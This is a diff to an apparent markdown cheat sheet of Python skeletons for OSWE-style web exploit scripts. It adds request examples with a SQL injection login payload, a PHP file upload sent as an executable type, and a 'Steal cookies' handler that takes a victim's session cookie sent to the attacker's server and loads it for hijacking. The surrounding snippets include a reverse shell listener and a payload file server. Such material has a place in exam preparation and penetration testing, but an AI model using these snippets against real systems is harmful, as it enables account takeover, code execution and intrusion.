@@ -3,9 +3,6 @@ Snippets are skeletons: adapt IPs, paths, payloads, and cookies to your target.
 
 ## Logging
 ```python
-import sys
-from datetime import datetime
-# ...
 GREEN = '\033[0;32m'
 RED = '\033[0;31m'
 GREY = '\033[38;5;244m'
@@ -34,33 +31,61 @@ class log():
 parser.add_argument('-d', '--debug', action='store_true', default=False, help='Enable debugging output')
 ```
 
-## Session Setup
+## Sending Requests
+### Session Setup
+Some data such as cookies, headers or proxy configuration can be configured permanently with the `update` function.
 ```python
-import requests
-# ...
 parser.add_argument("--proxy", help='proxy everything through burp', action='store_true', default=False)
 # ...
 s = requests.Session()
-s.verify = not args.no_verify
+# Interacting with an unverified HTTPS server (Using verify argument)
+s.verify = False
+# Disable redirects
+s.allow_redirects = False
+# Persistent cookies
+s.cookies.update({"PHPSESSID": "fakesession"})
+# Persistent headers
 s.headers.update({"User-Agent": "Mozilla/5.0"})
+# Configure proxies with argparse
 if args.proxy:
     s.proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
-
+```
+### Sending requests
+```python
 url = "http://localhost/login.php"
-data = { # Example data
+data = { 
     "username": "admin'-- -",
     "password": "anything",
 }
-cookies = "PHPSESSID=1234"
-r = s.post(url, data=data, cookies=cookies, allow_redirects=False)
+cookies = {
+    "PHPSESSID": "fakesession"
+}
+# Use "params" to send the data in the query params
 r = s.get(url, params={"id": 1, "name": "test"}, cookies=cookies)
-print (f"Status code: {r.status_code}")
-print (f"Response: {r.text}")
+# Use "data" to send the data in the body
+r = s.post(url, data=data, cookies=cookies, verify=False)
+# Use "json" to send the data in the body as a JSON
+r = s.post(url, json=data, cookies=cookies, allow_redirects=False)
+
+files = {
+    # (FILE_NAME, FILE_CONTENTS, FILE_MIMETYPE)
+    "uploaded_file": ("phpinfo.php", b"<?php phpinfo() ?>", "application/x-httpd-php")
+}
+# Use "files" to send files
+r.post(url, files=files)
 ```
+### Using the output
+```python
+print (f"Method: {r.request.method}")
+print (f"Status code: {r.status_code}")
+print (f"Response body as text: {r.text}")
+print (f"Response output as bytes: {r.content}")
+print (f"Response output as JSON (if body is a JSON): {r.json()}")
+print (f"Location Header: {r.headers['Location']}")
+```
+
 ## Common script arguments
 ```python
-import argparse
-# ...
 def parse_args():
     global args
     parser = argparse.ArgumentParser(description="OSWE Exploit Skeleton")
@@ -80,11 +105,6 @@ parse_args()
 
 ## Reverse shell handler
 ```python
-import socket
-import threading
-import socketserver
-import sys
-# ...
 def start_listener(host, port):
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -144,12 +164,6 @@ start_listener("0.0.0.0", 4444)
 
 ## HTTP Server
 ```python
-import socket
-import http.server
-import socketserver
-import sys
-import threading
-# ...
 def start_file_server(host, port):
     # Files source code
     php_file = b"<?php echo 'Hello World'; ?>"
@@ -195,4 +209,14 @@ def start_file_server(host, port):
     thread.start()
 # ...
 start_file_server("0.0.0.0", 80)
+```
+### Steal cookies
+```python
+def doGET(self):
+    # ...
+    # Load stolen cookie into session 
+    _, enc_cookie = self.path.split("/?cookie=", 1)
+    plain_cookie = urlsafe_b64decode(enc_cookie).decode()
+    session.cookies["PHPSESSID"] = cookies.SimpleCookie(plain_cookie)["PHPSESSID"]
+    print("[+] Stolen cookie:", session.cookies["PHPSESSID"])
 ```
